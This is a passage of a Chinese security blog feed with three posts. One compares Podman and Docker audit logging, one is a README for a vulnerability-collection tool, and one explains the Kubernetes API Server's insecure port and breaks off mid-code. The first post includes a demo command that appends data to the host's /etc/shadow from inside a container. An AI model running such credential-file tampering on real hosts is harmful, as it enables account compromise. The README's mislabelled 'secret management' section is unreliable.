sh<br><br></code></pre></td></tr></table></figure></li><li><p>向宿主机的 <code>/etc/shadow</code> 文件写入数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;docker,miao~&#x27;</span> | <span class="hljs-built_in">tee</span> -a /host/etc/shadow &gt; /dev/null<br><br></code></pre></td></tr></table></figure></li><li><p>使用 audit 所提供的工具 <code>ausearch</code> 来搜索近期与 <code>/etc/shadow</code> 文件相关的事件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ausearch -f /etc/shadow -i -ts recent<br><br></code></pre></td></tr></table></figure></li></ol><p>如下图所示，audit 可以记录 <code>/etc/shadow</code> 文件被修改了，但是不知道是谁修改的（auid&#x3D;unset）。在真实的业务环境中，如果攻击者随后删除了这个 Docker 容器，那么我们根本无法从海量的数据中准确找到修改 <code>/etc/shadow</code> 文件的痕迹。</p><p><img src="/image/663.png" alt="图 7: docker 容器修改宿主机的 &#x2F;etc&#x2F;shadow 文件"></p><p>接下来，我们来看看相同场景下，Podman 的表现如何。Podman 由于使用传统的 fork&#x2F;exec 模型，因此可以正确记录所有内容。</p><p><img src="/image/664.png" alt="图 8:podman 容器修改宿主机的 &#x2F;etc&#x2F;shadow 文件"></p><p>最后我们看到 <code>/etc/shadow</code> 都被写入了恶意数据。虽然这只是关于<code>/etc/shadow</code> 文件的一个简单的操作，但有的安全产品底层会使用 audit 来分析进程上的恶意行为，所以为了保持更好的安全性，我们推荐使用基于 fork&#x2F;exec 启动容器的运行时而不是基于 C&#x2F;S 启动容器的运行时。</p><p><img src="/image/665.png" alt="图 9：podman 容器和 docker 容器都往宿主机写入恶意数据"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>本文，我们从日志审计的角度解释为什么 Podman 比 Docker 更安全：</p><ul><li>**Podman 使用传统的 fork&#x2F;exec 模型。**容器进程正确继承父进程的 <code>loginuid</code>，使系统能追踪到操作的发起用户；</li><li>**而 Docker 使用 C&#x2F;S 模型。**容器进程继承 Docker 守护进程（dockerd）的 <code>loginuid</code>（值为 4294967295），因此无法追踪具体的操作用户。</li></ul><p>在实际攻击场景中，攻击者通过 Docker 容器修改宿主机的关键文件时，audit 日志无法记录操作者身份。相比之下，Podman 容器的所有操作都能被 audit 准确记录，有利于后续的安全审计和追踪。</p><p>除了日志审计的优势，Podman 还具有以下安全特性：</p><ul><li><strong>无需 root 权限即可运行容器，避免了守护进程可能带来的安全风险；</strong><ul><li>Docker 这类采用 C&#x2F;S 模型的运行时需要用户以 root 权限运行守护进程并打开套接字来启动容器。这导致我们只能依赖守护进程实现的安全机制，若守护进程存在安全漏洞，攻击者就可能直接影响主机操作系统的安全性。</li></ul></li><li>支持 systemd 的 <code>SD_NOTIFY</code> 功能和套接字激活功能，提供更安全高效的服务管理方式。<ul><li>当我们将 podman 命令放入 systemd unit 文件中，容器进程可通过 Podman 向 systemd 发送通知，表明容器已就绪并可接受外部请求。<code>SD_NOTIFY</code>功能提高了服务启动效率，避免竞态条件，实现更精确的服务管理。</li><li>此外，我们可以将连接套接字从 systemd 传递到 Podman，再传递到容器进程。这样容器无需独立处理网络连接，只需通过 systemd 就能直接响应外部网络请求，减少了额外配置。</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>collect-cloud-native-sec-vuln: 云原生安全漏洞收集工具</title>
    <link href="/2024/12/21/collect-cloud-native-sec-vuln-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
    <url>/2024/12/21/collect-cloud-native-sec-vuln-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>collect-cloud-native-sec-vuln 是一款用于收集云原生生态系统中各个组件安全漏洞的工具。</p><p><img src="/image/img_0.png" alt="图 1：工具手册"></p><p>通过自动化方式，它能帮助你及时获取到相关项目的最新安全信息，以便采取相应的防护措施。</p><p><img src="/image/img_1.png" alt="图 2：运行截图"></p><p>所有收集的 JSON 数据通过 Github Action，每 6 小时更新在仓库 <a href="https://github.com/miao2sec/cloud-native-sec-vuln">cloud-native-sec-vuln</a> 中。</p><p><img src="/image/img.png" alt="图 3：数据示例"></p><h2 id="0x01-快速开始"><a href="#0x01-快速开始" class="headerlink" title="0x01 快速开始"></a>0x01 快速开始</h2><h3 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1 安装"></a>1.1 安装</h3><ol><li><p>确保你的系统已安装 Go 环境，并克隆本项目到本地：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/miao2sec/collect-cloud-native-sec-vuln.git<br></code></pre></td></tr></table></figure></li><li><p>编译并生成可执行文件</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> collect-cloud-native-sec-vuln.git<br>go build -o collect<br></code></pre></td></tr></table></figure></li></ol><h3 id="1-2-使用"><a href="#1-2-使用" class="headerlink" title="1.2 使用"></a>1.2 使用</h3><ol><li><p>(使用默认配置) 进行漏洞收集</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./collect<br></code></pre></td></tr></table></figure></li><li><p>生成默认的配置文件</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./collect -g<br></code></pre></td></tr></table></figure></li><li><p>自定义漏洞数据的缓存路径</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./collect -r -c path/to/cacheDir<br></code></pre></td></tr></table></figure></li><li><p>使用自定义的配置文件进行漏洞收集</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./collect -r -f &lt;config&gt;.yaml<br></code></pre></td></tr></table></figure></li></ol><h2 id="0x02-功能特性"><a href="#0x02-功能特性" class="headerlink" title="0x02 功能特性"></a>0x02 功能特性</h2><ul><li>自动收集云原生生态系统中各个组件的安全漏洞信息。</li><li>支持自定义配置文件，灵活调整收集策略。</li><li>支持自定义缓存目录，随时查看漏洞数据。</li><li>支持多种命令行参数，方便用户操作。</li></ul><h2 id="0x03-配置说明"><a href="#0x03-配置说明" class="headerlink" title="0x03 配置说明"></a>0x03 配置说明</h2><p>配置文件采用 YAML 格式，以下是一个示例配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># token：GitHub API Token，用于访问 GitHub API</span><br><span class="hljs-attr">token:</span> <span class="hljs-string">write-your-github-token</span><br><span class="hljs-comment"># cache_dir：漏洞数据存储目录</span><br><span class="hljs-attr">cache_dir:</span> <span class="hljs-string">cloud-native-sec-vuln</span><br><span class="hljs-comment"># components：需要收集漏洞信息的组件列表，包括组件的 owner 和 repo。</span><br><span class="hljs-attr">components:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">owner:</span> <span class="hljs-string">moby</span><br>      <span class="hljs-attr">repo:</span> <span class="hljs-string">buildkit</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">owner:</span> <span class="hljs-string">opencontainers</span><br>      <span class="hljs-attr">repo:</span> <span class="hljs-string">runc</span><br></code></pre></td></tr></table></figure><h2 id="0x04-组件支持"><a href="#0x04-组件支持" class="headerlink" title="0x04 组件支持"></a>0x04 组件支持</h2><h3 id="4-1-运行时组件"><a href="#4-1-运行时组件" class="headerlink" title="4.1 运行时组件"></a>4.1 运行时组件</h3><ol><li>Docker (Moby)</li><li>runc</li><li>containerd</li><li>CRI-O</li><li>gVisor</li><li>inclavare-containers</li><li>iSulad</li><li>Kata Containers</li><li>Krustlet</li><li>Kuasar</li><li>Lima</li><li>LXC</li><li>rkt</li><li>Singularity</li><li>SmartOS</li><li>Stratovirt</li><li>Sysbox</li><li>Virtual Kubelet</li><li>WasmEdge</li><li>Youki</li><li>Podman</li></ol><h3 id="4-2-网络组件"><a href="#4-2-网络组件" class="headerlink" title="4.2 网络组件"></a>4.2 网络组件</h3><ol><li>Cilium</li></ol><h3 id="4-3-容器镜像构建"><a href="#4-3-容器镜像构建" class="headerlink" title="4.3 容器镜像构建"></a>4.3 容器镜像构建</h3><ol><li>Kaniko</li><li>BuildKit</li><li>Buildah</li><li>Bazel</li><li>img</li><li>orca-build</li></ol><h3 id="4-4-服务网格"><a href="#4-4-服务网格" class="headerlink" title="4.4 服务网格"></a>4.4 服务网格</h3><ol><li>istio</li></ol><h3 id="4-5-容器编排"><a href="#4-5-容器编排" class="headerlink" title="4.5 容器编排"></a>4.5 容器编排</h3><ol><li>kubernetes</li></ol><h3 id="4-6-容器管理平台"><a href="#4-6-容器管理平台" class="headerlink" title="4.6 容器管理平台"></a>4.6 容器管理平台</h3><ol><li>rancher</li></ol><h3 id="4-7-协调与服务发现"><a href="#4-7-协调与服务发现" class="headerlink" title="4.7 协调与服务发现"></a>4.7 协调与服务发现</h3><ol><li>coredns</li><li>etcd</li><li>zookeeper</li><li>kubebrain</li><li>nacos</li><li>k8gb</li><li>eureka</li><li>Xline</li></ol><h3 id="4-8-密钥管理"><a href="#4-8-密钥管理" class="headerlink" title="4.8 密钥管理"></a>4.8 密钥管理</h3><ol><li>chaos-mesh</li><li>litmus</li><li>chaostoolkit</li><li>chaosblade</li><li>chaoskube</li><li>powerfulseal</li><li>kubeinvaders</li><li>krkn</li></ol><h2 id="0x05-贡献指南"><a href="#0x05-贡献指南" class="headerlink" title="0x05 贡献指南"></a>0x05 贡献指南</h2><p>欢迎各位同学参与本项目，共同完善云原生安全漏洞收集工具。以下是贡献指南：</p><ol><li><p>Fork 本项目。</p></li><li><p>创建您的特性分支。</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git checkout -b new-feature<br></code></pre></td></tr></table></figure></li><li><p>提交您的修改。</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git commit -am <span class="hljs-string">&#x27;Add some feature&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>将您的修改推送到分支。</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git push origin new-feature<br></code></pre></td></tr></table></figure></li><li><p>提交 Pull Request。</p></li></ol><h2 id="0x06-许可证"><a href="#0x06-许可证" class="headerlink" title="0x06 许可证"></a>0x06 许可证</h2><p>本项目采用 MIT 许可证，详情请参阅 <a href="./LICENSE">LICENSE</a> 文件。</p>]]></content>
    
    
    
    <tags>
      
      <tag>云原生安全</tag>
      
      <tag>工具自研</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>API Server 安全风险（一）：不安全的服务（理论篇）</title>
    <link href="/2024/12/05/API-Server-%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%EF%BC%88%E7%90%86%E8%AE%BA%E7%AF%87%EF%BC%89/"/>
    <url>/2024/12/05/API-Server-%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%EF%BC%88%E7%90%86%E8%AE%BA%E7%AF%87%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在实际的工作和攻防对抗的时候，您是否遇到过以下问题：</p><ol><li>由于 API Server 错误配置，导致攻击者可以接管集群。</li><li>根据教程对 API Server 不安全端口的风险进行漏洞复现，却无法复现成功。</li><li>无法深入浅出的分析 API Server 不安全的服务的风险，被 API Server 各种大小版本之间的变化弄得一团乱。</li><li>由于环境限制，无法搭建多个 Kubernetes 环境进行靶场练习。</li><li>初学云原生安全时，通常感到无从下手，难度较大。</li></ol><p>为了解决上述问题，喵苗安全专家组成员特意制作了一系列《Kubernetes 安全防护指南（基础篇）》免费版图文教程，帮助大家入门云原生安全。本次课程的亮点有：</p><ol><li>根据 Kubernetes 各个版本发布的时间线，带领大家阅读 Kubernetes 关键源码，深入浅出地分析 Kubernetes 风险。</li><li>制作了开源的 Kubernetes 练习靶场，可在本地一键启动，无需虚拟机和服务器。</li><li>精心绘制的插图、诙谐有趣的叙述方式、理论知识与靶场练习相结合，带领你领略 Kubernetes 的安全。</li><li>搭建一个系统的 Kubernetes 学习框架，防止“管中窥豹，可见一斑”。</li><li>专家组的铲屎官将结合自身经验，帮助您总结关键知识和技能。</li></ol><h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><p>API Server 就像它名字所描述的那样，主要负责提供 REST API 接口，方便我们对 Kubernetes 集群进行管控。拥有 API Server 全部权限的用户相当于拥有了集群中所有机器的 root 访问权限。</p><p>而命令行工具 kubectl 就是 API Server 的客户端工具，主要负责向 API Server 发送请求以实现资源和工作负载的管理。需要注意的是，任何对 API Server 有写权限的人都可以以相同的方式对集群进行管控。</p><p><img src="/image/image_Uo8yOw_xpp.png" alt="图 1：API Server 与 kubectl 的关系（简化版）"></p><p>图 1：API Server 与 kubectl 的关系（简化版）</p><p>如图所示，当我们使用 kubectl 获取集群信息的时候，只要通过 <code>-v 8</code> 将日志的等级调到 8，就可以看到完整的 HTTP(S) 数据包。</p><p><img src="/image/image_6YDIbyDLuM.png" alt="图 2：kubectl 与 API Server 的交互本质上只是发起 HTTP(S) 请求"></p><p>图 2：kubectl 与 API Server 的交互本质上只是发起 HTTP(S) 请求</p><h2 id="0x02-本地访问不安全的服务"><a href="#0x02-本地访问不安全的服务" class="headerlink" title="0x02 本地访问不安全的服务"></a>0x02 本地访问不安全的服务</h2><p>早期，Kubernetes 集群需要允许负载均衡等组件进行健康检查和发现，所以默认情况下，API Server 会在本地监听不安全的服务。</p><p>以 2018 年 3 月 7 日发布的 Kubernetes v1.9.0 为例，Kubernetes 在创建 API Server 的时候，会创建不安全的服务 <code>InsecureServing</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs go"> <span class="hljs-comment">// NewServerRunOptions creates a new ServerRunOptions object with default parameters</span><br> <span class="hljs-comment">// 代码片段链接：https://github.com/kubernetes/kubernetes/blob/b5ec061c7ab9995a801206ea74f614ced04206d2/cmd/kube-apiserver/app/options/options.go#L76</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewServerRunOptions</span><span class="hljs-params">()</span></span> *ServerRunOptions &#123;<br>  s := ServerRunOptions&#123;<br>    GenericServerRunOptions: genericoptions.NewServerRunOptions(),<br>    Etcd:                 genericoptions.NewEtcdOptions(storagebackend.NewDefaultConfig(kubeoptions.DefaultEtcdPathPrefix, <span class="hljs-literal">nil</span>)),<br>    SecureServing:        kubeoptions.NewSecureServingOptions(),<br>    <span class="hljs-comment">// API Server 会创建不安全的服务</span><br>    InsecureServing:      kubeoptions.NewInsecureServingOptions(),<br>    Audit:                genericoptions.NewAuditOptions(),<br>    Features:             genericoptions.NewFeatureOptions(),<br>    Admission:            genericoptions.NewAdmissionOptions(),<br>    Authentication:       kubeoptions.NewBuiltInAuthenticationOptions().WithAll(),<br>    Authorization:        kubeoptions.NewBuiltInAuthorizationOptions(),<br>    CloudProvider:        kubeoptions.NewCloudProviderOptions(),<br>    StorageSerialization: kubeoptions.NewStorageSerializationOptions(),<br>    APIEnablement:        kubeoptions.NewAPIEnablementOptions(),<br><br>    EnableLogsHandler:      <span class="hljs-literal">true</span>,<br>    EventTTL:               <span class="hljs-number">1</span> * time.Hour,<br>    MasterCount:            <span class="hljs-number">1</span>,<br>    EndpointReconcilerType: <span class="hljs-type">string</span>(reconcilers.MasterCountReconcilerType),<br>    KubeletConfig: kubeletclient.KubeletClientConfig&#123;<br>      Port:         ports.KubeletPort,<br>      ReadOnlyPort: ports.KubeletReadOnlyPort,<br>      PreferredAddressTypes: []<span class="hljs-type">string</span>&#123;<br>        <span class="hljs-comment">// --override-hostname</span><br>        <span class="hljs-type">string</span>(api.NodeHostName),<br><br>        <span class="hljs-comment">// internal, preferring DNS if reported</span><br>        <span class="hljs-type">string</span>(api.NodeInternalDNS),<br>        <span class="hljs-type">string</span>(api.NodeInternalIP),<br><br>        <span class="hljs-comment">// external, preferring DNS if reported</span><br>        <span class="hljs-type">string</span>(api.NodeExternalDNS),<br>        <span class="hljs-type">string</span>(api.NodeExternalIP),<br>      &#125;,<br>      EnableHttps: <span class="hljs-literal">true</span>,<br>      HTTPTimeout: time.Duration(<span class="hljs-number">5</span>) * time.Second,<br>    &#125;,<br>    ServiceNodePortRange: kubeoptions.DefaultServiceNodePortRange,<br>  &#125;<br>  <span class="hljs-comment">// Overwrite the default for storage data format.</span><br>  s.Etcd.DefaultStorageMediaType = <span class="hljs-string">&quot;application/vnd.kubernetes.protobuf&quot;</span><br><br>  <span class="hljs-comment">// register all admission plugins</span><br>  RegisterAllAdmissionPlugins(s.Admission.Plugins)<br>  <span class="hljs-comment">// Set the default for admission plugins names</span><br>  s.Admission.PluginNames = []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;AlwaysAdmit&quot;</span>&#125;<br>  <span class="hljs-keyword">return</span> &amp;s<br>&#125;<br><br></code></pre></td></tr></table></figure><p>而这个不安全的服务的端口就是 <code>8080</code>，只能在本地进行访问，任何对该端口的请求都会跳过身份验证和权限检查。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// NewInsecureServingOptions is for creating an unauthenticated, unauthorized, insecure port.</span><br><span class="hljs-comment">// No one should be using these anymore.</span><br><span class="hljs-comment">// 代码片段链接：https://github.com/kubernetes/kubernetes/blob/b5ec061c7ab9995a801206ea74f614ced04206d2/pkg/kubeapiserver/options/serving.go#L75C1-L83C1</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewInsecureServingOptions</span><span class="hljs-params">()</span></span> *InsecureServingOptions &#123;<br>  <span class="hljs-keyword">return</span> &amp;InsecureServingOptions&#123;<br>    BindAddress: net.ParseIP(<span class="hljs-string">&quot;127.0.0.1&quot;</span>),<br>    <span class="hljs-comment">// 不安全服务的端口为 8080</span><br>    BindPort:    <span class="hljs-number">8080</span>,<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以直接通过 <code>curl</code> 命令进行检查，看看本地是否在监听不安全的服务。若命令执行过后，列出了 API 接口，那么不安全的服务是打开的状态。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl localhost:8080<br></code></pre></td></tr></table></figure><p><img src="/image/image_lxR7Ti5MsU.png" alt="图 3：本地在监听不安全的服务"></p><p>图 3：本地在监听不安全的服务</p><p>若该服务能被任何人进行访问，那么任何能够访问 master 节点的人都可以对集群进行管控，这是极其不安全的。所以默认情况下，这个不安全的服务只能在本地进行访问。<br><img src="/image/image_Ssctx5vMMw.png" alt="图 4：默认情况下，不安全的服务只能通过本地进行访问"></p><p>图 4：默认情况下，不安全的服务只能通过本地进行访问</p><h2 id="0x03-远程访问不安全的服务"><a href="#0x03-远程访问不安全的服务" class="headerlink" title="0x03 远程访问不安全的服务"></a>0x03 远程访问不安全的服务</h2><p>当然，这个不安全的服务也可以通过配置进行修改，让它可以被远程访问到。具体需要修改的 Flag 就是 <code>--insecure-bind-address</code> 和 <code>--insecure-port</code>。</p><p><code>--insecure-port</code> 用于提供未加密、未认证访问的服务端口。之所以会有这个设计，是因为 Kubernetes 假设了用户已经配置了防火墙规则，这个端口无法从集群外部进行访问，并且 nginx 默认会将集群公共地址上的 443 端口代理到这个端口。</p><p><code>--insecure-bind-address</code> 主要是与 <code>--insecure-port</code> 一起使用，若设置为 <code>0.0.0.0</code>，则允许所有的 IPv4 接口进行访问；若设置为 <code>::</code>，则允许所有的 IPv6 接口进行访问。</p><p>如图所示，我们可以将 <code>--insecure-bind-address</code> 设置为 <code>0.0.0.0</code>，<code>--insecure-port</code> 设置为 <code>8080</code> ，以达到可远程访问不安全的服务的目的。</p><p><img src="/image/image_6_pQE0mcDy.png" alt="图 5： &#x2F;etc&#x2F;kubernetes&#x2F;manifests&#x2F;kube-apiserver.yaml 配置文件"></p><p>图 5： &#x2F;etc&#x2F;kubernetes&#x2F;manifests&#x2F;kube-apiserver.yaml 配置文件</p><p>配置生效过后，只要我们获取到集群的 IP 地址，就能够对集群的不安全服务进行远程访问与控制。</p><p>由此看来，<code>--insecure-bind-address</code> 和 <code>--insecure-port</code> 是非常不安全的。</p><p><img src="/image/image_ZhzsBJWOx0.png" alt="图 6：对集群的不安全服务进行远程访问"></p><p>图 6：对集群的不安全服务进行远程访问</p><p>所以，在 2018 年 3 月 27 日发布的 v1.10.0 版本中，Kubernetes 将 <code>--insecure-bind-address</code> 和 <code>--insecure-port</code> 这两个 Flag 标记为弃用的状态，并宣称在未来的版本中将完全移除。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 代码片段链接：https://github.com/kubernetes/kubernetes/blob/f170ef66340f6355d331ed90902574ff0532a20a/pkg/kubeapiserver/options/serving.go#L98</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *InsecureServingOptions)</span></span> AddFlags(fs *pflag.FlagSet) &#123;<br>  fs.IPVar(&amp;s.BindAddress, <span class="hljs-string">&quot;insecure-bind-address&quot;</span>, s.BindAddress, <span class="hljs-string">&quot;&quot;</span>+<br>    <span class="hljs-string">&quot;The IP address on which to serve the --insecure-port (set to 0.0.0.0 for all IPv4 interfaces and :: for all IPv6 interfaces).&quot;</span>)<br>  fs.MarkDeprecated(<span class="hljs-string">&quot;insecure-bind-address&quot;</span>, <span class="hljs-string">&quot;This flag will be removed in a future version.&quot;</span>)<br>  fs.Lookup(<span class="hljs-string">&quot;insecure-bind-address&quot;</span>).Hidden = <span class="hljs-literal">false</span><br><br>  fs.IntVar(&amp;s.BindPort, <span class="hljs-string">&quot;insecure-port&quot;</span>, s.BindPort, <span class="hljs-string">&quot;&quot;</span>+<br>    <span class="hljs-string">&quot;The port on which to serve unsecured, unauthenticated access. It is assumed &quot;</span>+<br>    <span class="hljs-string">&quot;that firewall rules are set up such that this port is not reachable from outside of &quot;</span>+<br>    <span class="hljs-string">&quot;the cluster and that port 443 on the cluster&#x27;s public address is proxied to this &quot;</span>+<br>    <span class="hljs-string">&quot;port. This is performed by nginx in the default setup. Set to zero to disable.&quot;</span>)<br>  fs.MarkDeprecated(<span class="hljs-string">&quot;insecure-port&quot;</span>, <span class="hljs-string">&quot;This flag will be removed in a future version.&quot;</span>)<br>  fs.Lookup(<span class="hljs-string">&quot;insecure-port&quot;</span>).Hidden = <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>此后，<code>--insecure-bind-address</code> 和 <code>--insecure-port</code> 这两个 Flag 还能进行使用，但官方团队建议用户应尽早弃用，因为他们认为任何服务都应该先通过安全认证，才能进行使用。</p><p>于是， <code>--insecure-bind-address</code> 和 <code>--insecure-port</code> 就相当于被宣判了“死缓”。</p><h2 id="0x04-不安全的服务被关闭"><a href="#0x04-不安全的服务被关闭" class="headerlink" title="0x04 不安全的服务被关闭"></a>0x04 不安全的服务被关闭</h2><p>时间来到 2020 年 12 月 9 日，Kubernetes 发布的 v1.20.0 版本在根据默认配置创建 API Server 服务的时候，就删除了创建不安全的服务的代码。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// NewServerRunOptions creates a new ServerRunOptions object with default parameters</span><br><span class="hljs-comment">// 代码片段链接：https://github.com/kubernetes/kubernetes/blob/4a89df5617b8e1e26abb16150502d04e6c180533/cmd/kube-apiserver/app/options/options.go#L98</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewServerRunOptions</span><span class="hljs-params">()</span></span> *ServerRunOptions &#123;<br>  s := ServerRunOptions&#123;<br>    GenericServerRunOptions: genericoptions.NewServerRunOptions(),<br>    Etcd:                    genericoptions.NewEtcdOptions(storagebackend.NewDefaultConfig(kubeoptions.DefaultEtcdPathPrefix, <span class="hljs-literal">nil</span>)),<br>    SecureServing:           kubeoptions.NewSecureServingOptions(),<br>    <span class="hljs-comment">// 在此处，删除了不安全服务创建的代码</span><br>    Audit:                   genericoptions.NewAuditOptions(),<br>    Features:                genericoptions.NewFeatureOptions(),<br>    Admission:               kubeoptions.NewAdmissionOptions(),<br>    Authentication:          kubeoptions.NewBuiltInAuthenticationOptions().WithAll(),<br>    Authorization:           kubeoptions.NewBuiltInAuthorizationOptions(),<br>    CloudProvider:           kubeoptions.NewCloudProviderOptions(),<br>    APIEnablement:           genericoptions.NewAPIEnablementOptions(),<br>    EgressSelector:          genericoptions.NewEgressSelectorOptions(),<br>    Metrics:                 metrics.NewOptions(),<br>    Logs:                    logs.NewOptions(),<br><br>    EnableLogsHandler:                 <span class="hljs-literal">true</span>,<br>    EventTTL:                          <span class="hljs-number">1</span> * time.Hour,<br>    MasterCount:                       <span class="hljs-number">1</span>,<br>    EndpointReconcilerType:            <span class="hljs-type">string</span>(reconcilers.LeaseEndpointReconcilerType),<br>    IdentityLeaseDurationSeconds:      <span class="hljs-number">3600</span>,<br>    IdentityLeaseRenewIntervalSeconds: <span class="hljs-number">10</span>,<br>    KubeletConfig: kubeletclient.KubeletClientConfig&#123;<br>      Port:         ports.KubeletPort,<br>     